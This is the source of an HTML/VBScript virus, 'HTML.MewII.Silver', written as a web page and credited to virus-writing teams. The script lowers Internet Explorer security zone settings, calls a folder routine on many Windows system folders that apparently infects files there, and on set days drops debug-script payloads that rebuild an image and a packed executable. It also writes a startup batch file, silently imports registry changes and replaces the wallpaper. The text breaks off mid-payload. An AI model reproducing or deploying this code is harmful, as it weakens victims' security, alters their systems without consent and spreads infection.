<!--MewII Silver-->
<HTML>
<BODY>
<SCRIPT Language = "JavaScript">
<!--
	var userAgent=navigator.appName;
	var agentInfo=userAgent.substring(0, 1);
    if(agentInfo == "M"){
}
else {
alert("The page you want to view was designed for Internet Explorer only, \n Please view this page with Internet Explorer")
self.close()
}
//-->
</SCRIPT>
<Script Language = "VBScript">
<!--
On Error Resume Next
'HTML.MewII.Silver
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'Technology used from foxz [NoMercyVirusTeam]
'Specal Thanks to Evul for help with Win32.Joke.MewII
'Part of the HTML Pokemon Family
'This Family goes out to IDT
Set WSHShell = CreateObject("WScript.Shell")
WSHShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WSHShell.Regwrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
If location.protocol = "file:" then
  Randomize
  Set FSO = CreateObject("Scripting.FileSystemObject")
  Set TRange = document.body.createTextRange
  HPath = Replace(location.href, "/", "\")
  HPath = Replace(HPath, "file:\\\", "")
  HPath = FSO.GetParentFolderName(HPath)
  Call GetFolder(HPath)
  Call GetFolder("C:\")
  Call GetFolder("C:\My Documents")
  Call GetFolder("C:\Windows")
  Call GetFolder("C:\Windows\System")
  Call GetFolder("C:\Windows\ShellNew")
  Call GetFolder("C:\Windows\Help")
  Call GetFolder("C:\Windows\Temp")
  Call GetFolder("C:\Windows\Web")
  Call GetFolder("C:\Windows\Web\Wallpaper")
  Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
  Call GetFolder("C:\Inetpub\wwwroot")
  Call GetFolder("C:\Inetpub\wwwroot\myweb")
  Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
  Call GetFolder("C:\Program Files\Microsoft FrontPage\bin")
End If
If Day(Now()) = 5 or Day(Now()) = 15 or Day(Now()) = 20  Then
  Set DropMewSilver = FSO.CreateTextFile("c:\Windows\pokemon.dll", 2, False)
  DropMewSilver.WriteLine "n mew2.jpg"
  DropMewSilver.WriteLine "e 0100 ff d8 ff e0 00 10 4a 46 49 46 00 01 01 01 00 60 "
  DropMewSilver.WriteLine "e 0110 00 60 00 00 ff fe 00 17 43 72 65 61 74 65 64 20 "
  DropMewSilver.WriteLine "e 0120 77 69 74 68 20 54 68 65 20 47 49 4d 50 ff db 00 "
  DropMewSilver.WriteLine "e 0130 43 00 08 06 06 07 06 05 08 07 07 07 09 09 08 0a "
  DropMewSilver.WriteLine "e 0140 0c 14 0d 0c 0b 0b 0c 19 12 13 0f 14 1d 1a 1f 1e "
  DropMewSilver.WriteLine "e 0150 1d 1a 1c 1c 20 24 2e 27 20 22 2c 23 1c 1c 28 37 "
  DropMewSilver.WriteLine "e 0160 29 2c 30 31 34 34 34 1f 27 39 3d 38 32 3c 2e 33 "
  DropMewSilver.WriteLine "e 0170 34 32 ff db 00 43 01 09 09 09 0c 0b 0c 18 0d 0d "
  DropMewSilver.WriteLine "e 0180 18 32 21 1c 21 32 32 32 32 32 32 32 32 32 32 32 "
  DropMewSilver.WriteLine "e 0190 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 "
  DropMewSilver.WriteLine "e 01a0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 "
  DropMewSilver.WriteLine "e 01b0 32 32 32 32 32 32 32 ff c0 00 11 08 00 6f 00 50 "
  DropMewSilver.WriteLine "e 01c0 03 01 22 00 02 11 01 03 11 01 ff c4 00 1b 00 00 "
  DropMewSilver.WriteLine "e 01d0 02 03 01 01 01 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewSilver.WriteLine "e 01e0 06 04 05 07 03 02 01 ff c4 00 37 10 00 01 03 03 "
  DropMewSilver.WriteLine "e 01f0 02 04 04 04 04 05 05 01 00 00 00 00 01 02 03 04 "
  DropMewSilver.WriteLine "e 0200 00 05 11 06 21 12 13 31 41 51 61 71 81 07 22 91 "
  DropMewSilver.WriteLine "e 0210 c1 14 42 a1 f0 23 33 b1 d1 e1 15 24 32 43 52 b2 "
  DropMewSilver.WriteLine "e 0220 ff c4 00 18 01 00 03 01 01 00 00 00 00 00 00 00 "
  DropMewSilver.WriteLine "e 0230 00 00 00 00 00 00 02 03 01 04 ff c4 00 1f 11 00 "
  DropMewSilver.WriteLine "e 0240 03 01 01 00 03 00 03 01 00 00 00 00 00 00 00 00 "
  DropMewSilver.WriteLine "e 0250 01 02 11 21 03 12 31 22 41 61 91 ff da 00 0c 03 "
  DropMewSilver.WriteLine "e 0260 01 00 02 11 03 11 00 3f 00 df ea 05 ee 53 90 ac "
  DropMewSilver.WriteLine "e 0270 57 09 4d 03 cc 66 3b 8b 46 07 70 92 45 4f af 0f "
  DropMewSilver.WriteLine "e 0280 34 87 d9 71 a7 12 14 da d2 52 a4 9e e0 8c 11 40 "
  DropMewSilver.WriteLine "e 0290 08 96 1b ab c8 10 de 4b ab 77 9e a4 25 cc e4 f1 "
  DropMewSilver.WriteLine "e 02a0 71 10 3e f9 a7 e1 d2 b2 26 4c bd 0b 7f 10 e6 21 "
  DropMewSilver.WriteLine "e 02b0 46 09 59 31 64 2b a2 93 e0 4f 88 1b 11 5a 5d ba "
  DropMewSilver.WriteLine "e 02c0 f5 0a e2 ca 54 cb c8 e2 23 fe 05 43 35 7f 2a dc "
  DropMewSilver.WriteLine "e 02d0 a4 75 79 d7 b2 57 2b 87 4b a4 f1 02 12 9d 18 2b "
  DropMewSilver.WriteLine "e 02e0 2a 08 40 f1 24 fd b7 3e d5 29 97 39 ac a1 ce 9c "
  DropMewSilver.WriteLine "e 02f0 40 1a 52 ba 3e 89 ba 56 2c a4 bc 16 a6 e5 24 9c "
  DropMewSilver.WriteLine "e 0300 64 7c c5 45 24 1f 4e 23 f4 a6 04 bc 88 b1 23 17 "
  DropMewSilver.WriteLine "e 0310 5c 09 e2 58 00 a8 e3 b1 fb 0a 87 ec e7 ce 16 34 "
  DropMewSilver.WriteLine "e 0320 51 45 02 85 14 51 40 05 14 57 95 ad 0d a4 a9 6a "
  DropMewSilver.WriteLine "e 0330 09 03 a9 3b 50 04 79 f6 e8 77 48 aa 8b 3a 33 72 "
  DropMewSilver.WriteLine "e 0340 18 56 e5 0e 27 23 3e 3e 47 ce 91 ae 9f 0c 94 95 "
  DropMewSilver.WriteLine "e 0350 a9 fb 0d dd e8 4a ea 18 74 73 1b 1e 87 a8 fd 69 "
  DropMewSilver.WriteLine "e 0360 c1 db f5 bd b5 14 89 09 59 07 1f 29 1d 6b b2 26 "
  DropMewSilver.WriteLine "e 0370 35 31 85 04 71 25 2a 49 1c 44 56 cd b5 f1 8f 3e "
  DropMewSilver.WriteLine "e 0380 f3 d4 66 5c 72 da 2c 34 95 a7 f0 32 43 2b e0 ef "
  DropMewSilver.WriteLine "e 0390 cc 4a 37 3e 87 03 de 98 64 da 1c 72 ee 2f 53 dd "
  DropMewSilver.WriteLine "e 03a0 e7 db e3 c7 0e 32 c2 89 21 0b 4a 37 25 3f a8 ac "
  DropMewSilver.WriteLine "e 03b0 e2 c3 76 5c ab 8a a3 cb 51 43 ac b9 84 36 a3 d0 "
  DropMewSilver.WriteLine "e 03c0 61 5b 81 ed 8f 7a 7f b9 6a 74 46 91 67 b1 b7 fc "
  DropMewSilver.WriteLine "e 03d0 57 a6 60 49 48 df 96 ce 37 27 c3 a6 3d 8d 0a 9a "
  DropMewSilver.WriteLine "e 03e0 fa 3f d4 31 69 dd 55 07 50 46 0b 61 69 0a ce 31 "
  DropMewSilver.WriteLine "e 03f0 9e ff 00 6a bf ac ae c9 a3 25 d9 f5 0c 87 ed 52 "
  DropMewSilver.WriteLine "e 0400 d0 ab 6a c7 c8 85 95 73 00 ea 33 b6 36 3d eb 4b "
  DropMewSilver.WriteLine "e 0410 8e f9 e5 20 3e 38 5d c7 cd b6 d9 a6 bf 5f b2 1e "
  DropMewSilver.WriteLine "e 0420 48 4b 1a ff 00 09 34 50 0e 68 a4 22 2f ea 0d 42 "
  DropMewSilver.WriteLine "e 0430 9b 72 c4 38 e4 19 4a 48 5a 89 1b 36 9c e3 3e a7 "
  DropMewSilver.WriteLine "e 0440 b0 f2 26 96 6f 2f 4b bb b4 cd b1 88 2e c9 5b df "
  DropMewSilver.WriteLine "e 0450 f6 89 1c b0 15 e2 77 f0 f2 a5 58 97 27 af 37 d9 "
  DropMewSilver.WriteLine "e 0460 f3 9d 04 12 ea 88 19 e8 9c e1 23 d8 01 f4 a7 9d "
  DropMewSilver.WriteLine "e 0470 24 da e4 5c 94 f6 08 6d 94 6f b7 e6 3b 0f d3 34 "
  DropMewSilver.WriteLine "e 0480 f3 39 f9 32 8b 14 8a 92 b4 16 a5 b6 43 0f b4 b6 "
  DropMewSilver.WriteLine "e 0490 a6 03 fc d8 c8 59 24 0f 22 40 cd 4b b1 6a 17 ed "
  DropMewSilver.WriteLine "e 04a0 ca 53 12 60 dd 13 83 94 b4 e3 6b c6 73 83 b7 7a "
  DropMewSilver.WriteLine "e 04b0 d5 e9 3b e2 35 f1 eb 3d 85 2d b1 94 aa 52 8b 7c "
  DropMewSilver.WriteLine "e 04c0 63 b0 c6 71 ef d3 d3 34 7b 6f 04 4d 98 ee a9 8a "
  DropMewSilver.WriteLine "e 04d0 fa 2f 8b ba c3 8c fc 3e 62 f9 8d 15 b6 51 d7 7d "
  DropMewSilver.WriteLine "e 04e0 b3 eb 56 56 25 3c c9 95 3d 71 9e 99 35 dc f3 96 "
  DropMewSilver.WriteLine "e 04f0 10 55 cb 40 dc 8d bf 7f 4a ba b6 ea 56 b5 45 85 "
  DropMewSilver.WriteLine "e 0500 56 2b ab 8d c5 9c 85 66 34 85 9c a1 4a 1d 89 1e "
  DropMewSilver.WriteLine "e 0510 3b 8f 7a f9 17 58 a6 d4 fb 31 e0 46 42 99 07 81 "
  DropMewSilver.WriteLine "e 0520 c7 10 80 94 93 dc fe fe b5 8d 7f 07 9c dd 3b 5b "
  DropMewSilver.WriteLine "e 0530 f5 82 62 f3 0b 48 96 fa d4 90 10 8e 22 50 9c 78 "
  DropMewSilver.WriteLine "e 0540 ff 00 63 56 05 5a b2 74 56 2f 0c 47 12 62 39 95 "
  DropMewSilver.WriteLine "e 0550 16 1b 7b 85 c2 01 c7 43 db d0 e6 a9 af 12 19 9b "
  DropMewSilver.WriteLine "e 0560 74 8f 0a d2 a0 b5 4f 20 a1 23 f2 12 70 41 f7 ad "
  DropMewSilver.WriteLine "e 0570 86 dd 09 bb 75 ba 3c 36 c7 c8 cb 61 03 cf 1d ea "
  DropMewSilver.WriteLine "e 0580 94 a6 52 68 a7 93 21 2c 7d 16 f4 d6 a5 6e eb 21 "
  DropMewSilver.WriteLine "e 0590 51 02 56 c3 e9 6c 2d 2d 29 59 c6 3a a7 d4 7f 7a "
  DropMewSilver.WriteLine "e 05a0 6a 65 d0 ea 33 d1 40 e0 8f 03 59 25 cc 39 a6 b5 "
  DropMewSilver.WriteLine "e 05b0 bc a9 2d 23 25 2e 97 91 e1 c0 ad f1 e9 be 2b 45 "
  DropMewSilver.WriteLine "e 05c0 72 ec 80 98 53 62 a5 b7 23 49 c1 71 45 78 28 49 "
  DropMewSilver.WriteLine "e 05d0 1d 71 83 9d f0 08 da a6 d6 74 8e 68 99 76 d1 f3 "
  DropMewSilver.WriteLine "e 05e0 a0 6a 57 64 c0 65 6b b7 4c 51 71 ce 4a 42 96 d2 "
  DropMewSilver.WriteLine "e 05f0 fa 9f 94 e3 63 be 37 ef f5 75 d3 d6 d7 6d f0 bf "
  DropMewSilver.WriteLine "e 0600 8b c2 95 b9 82 50 94 e3 1e bb 9d ff 00 41 57 14 "
  DropMewSilver.WriteLine "e 0610 50 e9 b5 86 6f 30 29 33 e2 81 40 d1 4f 25 4c 73 "
  DropMewSilver.WriteLine "e 0620 56 b7 9b 43 40 75 4a 8a b6 23 cf af d6 9c e9 56 "
  DropMewSilver.WriteLine "e 0630 e9 72 6e 6d e0 42 09 4a 9a 8a a0 54 48 ce 5c ff "
  DropMewSilver.WriteLine "e 0640 00 1f d6 89 5a f8 6c ad 78 62 96 8b 43 f3 24 94 "
  DropMewSilver.WriteLine "e 0650 ad b0 cf 29 c2 d3 a5 60 e1 2b 1f 97 1d 73 e5 eb "
  DropMewSilver.WriteLine "e 0660 53 67 5a 2e 96 d9 e2 d5 1e 38 5a df 5f 02 38 06 "
  DropMewSilver.WriteLine "e 0670 52 b2 7a 81 9e 87 c4 55 ae a3 9a b5 6a 19 2e c5 "
  DropMewSilver.WriteLine "e 0680 4a 52 94 3e a2 f7 2c 75 c7 0a 78 88 f2 e1 19 fa "
  DropMewSilver.WriteLine "e 0690 d3 b5 bd 65 c9 6d 5c a7 b5 c2 fa 9d 1f 87 ce c7 "
  DropMewSilver.WriteLine "e 06a0 84 8d d5 8f 31 fb de b5 ba 4c a2 84 f8 8a df 86 "
  DropMewSilver.WriteLine "e 06b0 3a 41 c8 f8 bf dc 5b 52 5f 50 28 8c d2 c6 38 13 "
  DropMewSilver.WriteLine "e 06c0 d0 a8 8f 13 db cb 3e 35 a7 d7 84 28 10 08 e8 7a "
  DropMewSilver.WriteLine "e 06d0 57 ba 56 f5 92 6f 58 a3 ab f4 fc ab 8a d3 32 24 "
  DropMewSilver.WriteLine "e 06e0 56 65 ad 0d f2 cb 0b 59 6d 44 64 9c 85 03 8e fd "
  DropMewSilver.WriteLine "e 06f0 0d 56 69 bd 2b 76 4c 86 bf d5 4f 2a 0b 43 89 b8 "
  DropMewSilver.WriteLine "e 0700 e9 50 cf 16 49 c2 b1 9d bd eb 41 a2 8d e6 02 6d "
  DropMewSilver.WriteLine "e 0710 05 14 51 58 61 16 e7 2f f0 16 b9 72 f1 9e 43 2b "
  DropMewSilver.WriteLine "e 0720 73 1e 38 04 d6 67 a7 64 97 50 1d 71 59 5a f2 a5 "
  DropMewSilver.WriteLine "e 0730 2b c4 9d c9 a7 7d 6e fa a3 68 cb a3 89 ea 59 e1 "
  DropMewSilver.WriteLine "e 0740 f6 51 00 fe 86 b3 2d 3e f1 6e 10 21 5b 01 5d 1e "
  DropMewSilver.WriteLine "e 0750 04 b1 d3 1f c6 f2 88 36 e7 14 de be b8 46 5e 72 "
  DropMewSilver.WriteLine "e 0760 a9 4b 50 cf fe 57 95 0f bd 68 b7 97 53 23 54 44 "
  DropMewSilver.WriteLine "e 0770 88 95 7f 2c 73 15 eb d0 7d e9 75 dd 3e d7 fb 1d "
  DropMewSilver.WriteLine "e 0780 49 cc 50 96 a7 90 97 10 3a 16 94 78 52 4f 9e 7b "
  DropMewSilver.WriteLine "e 0790 f9 e3 b5 58 dd d0 60 ea f8 f3 16 b3 89 69 52 52 "
  DropMewSilver.WriteLine "e 07a0 0f 44 f0 ab 1f 7c d2 d3 55 5a 87 9a ca 1f 99 f9 "
  DropMewSilver.WriteLine "e 07b0 a3 81 9e db 1a ec 85 71 20 1a 83 09 f0 e3 40 83 "
  DropMewSilver.WriteLine "e 07c0 9d aa 53 07 e6 5a 7b 6c 6a 74 b1 93 a5 8d a3 b5 "
  DropMewSilver.WriteLine "e 07d0 14 51 4a 28 51 45 14 01 02 f5 6c 4d e2 cd 2e dc "
  DropMewSilver.WriteLine "e 07e0 b7 0b 62 43 65 1c 60 67 87 3d f1 59 1c dd 29 74 "
  DropMewSilver.WriteLine "e 07f0 d3 12 a2 45 91 36 32 e2 4a 74 b4 87 50 15 c4 37 "
  DropMewSilver.WriteLine "e 0800 18 04 76 27 3e 35 b5 d2 9e aa 65 17 09 91 e2 ac "
  DropMewSilver.WriteLine "e 0810 7f 20 25 e1 b7 e6 2b c0 ff 00 e4 d5 3c 6d ef a8 "
  DropMewSilver.WriteLine "e 0820 d2 9b 7c 3e 3b 6d 92 bd 3d 2e 2a 14 b7 f8 1c 69 "
  DropMewSilver.WriteLine "e 0830 4d 8d 8a 80 4a d2 ae 11 d3 6c 0d aa 83 e2 24 4b "
  DropMewSilver.WriteLine "e 0840 81 b7 db df 63 84 08 e9 71 e5 24 a8 05 83 91 9c "
  DropMewSilver.WriteLine "e 0850 78 f5 ed e1 5a 05 b5 23 92 e2 c7 e6 70 fe 9b 7d "
  DropMewSilver.WriteLine "e 0860 a9 6b e2 5d bf f1 5a 51 72 10 3f 8b 11 c4 b8 08 "
  DropMewSilver.WriteLine "e 0870 eb 82 78 4f f5 cf b5 09 e5 9b 6d 7b 31 73 47 eb "
  DropMewSilver.WriteLine "e 0880 34 49 4a 63 be ae 17 06 d5 a1 db a5 a2 4b ef 04 "
  DropMewSilver.WriteLine "e 0890 2b 88 a5 29 c9 1e f5 8f 69 dd 10 8b e2 d8 7e 3d "
  DropMewSilver.WriteLine "e 08a0 d1 c8 72 31 cc 50 e4 f1 0c 67 1b 1c 8f d8 35 af "
  DropMewSilver.WriteLine "e 08b0 d8 ac ac d8 ad e2 2b 4e 38 f2 c9 e2 71 d7 0e 54 "
  DropMewSilver.WriteLine "e 08c0 b5 78 ff 00 8a 7f 2d 27 f0 d7 5c c6 8b 3a 28 a2 "
  DropMewSilver.WriteLine "e 08d0 a0 4c 28 a2 8a 00 2a 82 f3 a6 13 73 9a 89 ac 4d "
  DropMewSilver.WriteLine "e 08e0 7a 24 a4 80 92 a4 7c c9 58 19 c6 52 7b 8c 9d c7 "
  DropMewSilver.WriteLine "e 08f0 8f 7a bf a2 b5 36 9e a0 39 46 8e 98 b1 d0 ca 49 "
  DropMewSilver.WriteLine "e 0900 21 23 19 57 53 e6 6b c4 e8 8d 4f 82 f4 47 86 5a "
  DropMewSilver.WriteLine "e 0910 79 05 0a f4 23 15 22 8a c0 11 b4 04 67 99 80 f4 "
  DropMewSilver.WriteLine "e 0920 67 d4 12 b8 92 56 df 4d ce fe 7e 79 a7 84 a8 28 "
  DropMewSilver.WriteLine "e 0930 52 45 f2 6b 9a 52 f0 f4 b5 36 57 6f 9e 52 72 93 "
  DropMewSilver.WriteLine "e 0940 bb 6e f4 23 1e 07 63 9f 1c f4 a6 7b 47 e2 95 1d "
  DropMewSilver.WriteLine "e 0950 4e cb 09 4a d7 82 94 83 9d b1 df ce a9 7d e8 ef "
  DropMewSilver.WriteLine "e 0960 a9 3d 2c 68 a2 8a 98 87 ff d9 "
  DropMewSilver.WriteLine "RCX"
  DropMewSilver.WriteLine "086a"
  DropMewSilver.WriteLine "W"
  DropMewSilver.WriteLine "Q"
  DropMewSilver.Close
  Set MyBat = FSO.CreateTextFile("c:\Windows\WinStart.bat", 2, False)
  MyBat.WriteLine ""
  MyBat.WriteLine "@echo off"
  MyBat.WriteLine "debug < c:\Windows\pokemon.dll > nul"
  MyBat.WriteLine ""
  MyBat.Close
  Set MyReg = FSO.CreateTextFile("c:\Windows\pokemon.reg", 2, False)
  MyReg.WriteLine "REGEDIT4"
  MyReg.WriteLine ""
  MyReg.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]"
  MyReg.WriteLine chr(34) & "ShellState" & chr(34) & "=hex:1c,00,00,00,e3,08,00,00,00,00,00,00,00,00,00,00,00,00,00,00,01,00,00,00,0a,00,00,00"
  MyReg.WriteLine ""
  WshShell.Run("regedit /s c:\Windows\pokemon.reg"), VbHide
  WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\Wallpaper", "C:\Windows\mew2.jpg" 
  WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\BackupWallpaper", "C:\Windows\mew2.jpg" 
  WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\desktop\TileWallpaper", "1"
  WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\desktop\Wallpaper", "C:\Windows\mew2.jpg" 
  Set DropMewJoke = FSO.CreateTextFile("c:\Windows\pokemon2.dll", 2, False)
  DropMewJoke.WriteLine "n MEWII.EXE"
  DropMewJoke.WriteLine "e 0100 4d 5a 50 00 02 00 00 00 04 00 0f 00 ff ff 00 00 "
  DropMewJoke.WriteLine "e 0110 b8 00 00 00 00 00 00 00 40 00 1a 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 "
  DropMewJoke.WriteLine "e 0140 ba 10 00 0e 1f b4 09 cd 21 b8 01 4c cd 21 90 90 "
  DropMewJoke.WriteLine "e 0150 54 68 69 73 20 70 72 6f 67 72 61 6d 20 6d 75 73 "
  DropMewJoke.WriteLine "e 0160 74 20 62 65 20 72 75 6e 20 75 6e 64 65 72 20 57 "
  DropMewJoke.WriteLine "e 0170 69 6e 33 32 0d 0a 24 37 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 01a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 01b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 01c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 01d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 01e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 01f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0200 50 45 00 00 4c 01 03 00 33 29 a0 30 00 00 00 00 "
  DropMewJoke.WriteLine "e 0210 00 00 00 00 e0 00 8f 81 0b 01 02 19 00 10 00 00 "
  DropMewJoke.WriteLine "e 0220 00 10 00 00 00 50 00 00 60 61 00 00 00 60 00 00 "
  DropMewJoke.WriteLine "e 0230 00 70 00 00 00 00 40 00 00 10 00 00 00 02 00 00 "
  DropMewJoke.WriteLine "e 0240 01 00 00 00 00 00 00 00 03 00 0a 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0250 00 80 00 00 00 04 00 00 00 00 00 00 02 00 00 00 "
  DropMewJoke.WriteLine "e 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00 "
  DropMewJoke.WriteLine "e 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0280 00 70 00 00 a8 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 02a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 02b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 02c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 02d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 02e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 02f0 00 00 00 00 00 00 00 00 55 50 58 30 00 00 00 00 "
  DropMewJoke.WriteLine "e 0300 00 50 00 00 00 10 00 00 00 00 00 00 00 04 00 00 "
  DropMewJoke.WriteLine "e 0310 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 e0 "
  DropMewJoke.WriteLine "e 0320 55 50 58 31 00 00 00 00 00 10 00 00 00 60 00 00 "
  DropMewJoke.WriteLine "e 0330 00 04 00 00 00 04 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0340 00 00 00 00 40 00 00 e0 55 50 58 32 00 00 00 00 "
  DropMewJoke.WriteLine "e 0350 00 10 00 00 00 70 00 00 00 02 00 00 00 08 00 00 "
  DropMewJoke.WriteLine "e 0360 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 c0 "
  DropMewJoke.WriteLine "e 0370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 03a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 03b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 03c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 03d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 03e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 03f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0440 00 00 0a 00 24 49 6e 66 6f 3a 20 54 68 69 73 20 "
  DropMewJoke.WriteLine "e 0450 66 69 6c 65 20 69 73 20 70 61 63 6b 65 64 20 77 "
  DropMewJoke.WriteLine "e 0460 69 74 68 20 74 68 65 20 55 50 58 20 65 78 65 63 "
  DropMewJoke.WriteLine "e 0470 75 74 61 62 6c 65 20 70 61 63 6b 65 72 20 68 74 "
  DropMewJoke.WriteLine "e 0480 74 70 3a 2f 2f 75 70 78 2e 74 73 78 2e 6f 72 67 "
  DropMewJoke.WriteLine "e 0490 20 24 0a 00 24 49 64 3a 20 55 50 58 20 31 2e 30 "
  DropMewJoke.WriteLine "e 04a0 31 20 43 6f 70 79 72 69 67 68 74 20 28 43 29 20 "
  DropMewJoke.WriteLine "e 04b0 31 39 39 36 2d 32 30 30 30 20 74 68 65 20 55 50 "
  DropMewJoke.WriteLine "e 04c0 58 20 54 65 61 6d 2e 20 41 6c 6c 20 52 69 67 68 "
  DropMewJoke.WriteLine "e 04d0 74 73 20 52 65 73 65 72 76 65 64 2e 20 24 0a 00 "
  DropMewJoke.WriteLine "e 04e0 55 50 58 21 0c 09 02 07 11 4a b6 7f ab 7d 77 81 "
  DropMewJoke.WriteLine "e 04f0 be 41 00 00 55 01 00 00 00 10 00 00 26 00 00 72 "
  DropMewJoke.WriteLine "e 0500 fd db bb ff 6a 01 68 00 20 40 00 68 10 04 6a 00 "
  DropMewJoke.WriteLine "e 0510 e8 00 00 11 eb eb ff 25 30 30 27 a0 aa ac 0e 00 "
  DropMewJoke.WriteLine "e 0520 4d 65 b3 ff ff ff 77 20 49 49 20 28 53 69 6c 76 "
  DropMewJoke.WriteLine "e 0530 65 72 29 00 57 65 6c 63 6f 6d 65 20 54 6f 20 1a "
  DropMewJoke.WriteLine "e 0540 bf ff ff db 0d 0a 01 59 6f 75 72 20 50 6f 6b e9 "
  DropMewJoke.WriteLine "e 0550 6d 6f 6e 20 53 65 65 6d 73 1f 4c 69 df fe df b5 "
  DropMewJoke.WriteLine "e 0560 6b 27 1a 21 00 4b 6e 6f 77 64 65 74 68 00 5b 33 "
  DropMewJoke.WriteLine "e 0570 74 61 70 68 bf fd b7 db 61 73 18 56 58 23 65 61 "
  DropMewJoke.WriteLine "e 0580 6d 20 26 20 4e 6f 15 72 63 79 56 69 66 ff ed ef "
  DropMewJoke.WriteLine "e 0590 72 75 73 12 5d 00 4a 4a 65 2e 57 69 6e 33 32 2e "
  DropMewJoke.WriteLine "e 05a0 64 03 a8 2a 0b 6a 49 40 44 06 a4 45 a8 0a 00 cd "
  DropMewJoke.WriteLine "e 05b0 54 14 80 96 61 30 e5 c9 ff 97 20 01 4d 65 73 73 "
  DropMewJoke.WriteLine "e 05c0 61 67 65 42 6f 78 41 50 45 e6 ff 21 ff 4c 01 04 "
  DropMewJoke.WriteLine "e 05d0 00 33 29 a0 30 e0 00 8f 81 0b 01 02 19 00 02 ec "
  DropMewJoke.WriteLine "e 05e0 1b 6c 90 06 10 03 20 0c 40 0b 0b f6 60 dd 1f 01 "
  DropMewJoke.WriteLine "e 05f0 1e 03 00 0a 50 03 be 37 ec ac 04 0a 02 38 33 07 "
  DropMewJoke.WriteLine "e 0600 10 84 ba 64 cb 4a 00 75 52 0f ab c0 62 83 6a 00 "
  DropMewJoke.WriteLine "e 0610 d9 c0 12 f6 43 4f 44 45 d7 eb 00 df b2 c3 bf b6 "
  DropMewJoke.WriteLine "e 0620 60 44 41 54 29 fb 27 08 32 d8 3f 65 a2 c0 2e 69 "
  DropMewJoke.WriteLine "e 0630 64 61 74 61 27 30 20 3f 80 0c 0a 72 65 6c 6f 63 "
  DropMewJoke.WriteLine "e 0640 7d 53 32 c8 40 0c 50 04 38 00 00 00 d7 47 1a 07 "
  DropMewJoke.WriteLine "e 0650 40 02 00 00 ff 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0660 60 be 00 60 40 00 8d be 00 b0 ff ff 57 83 cd ff "
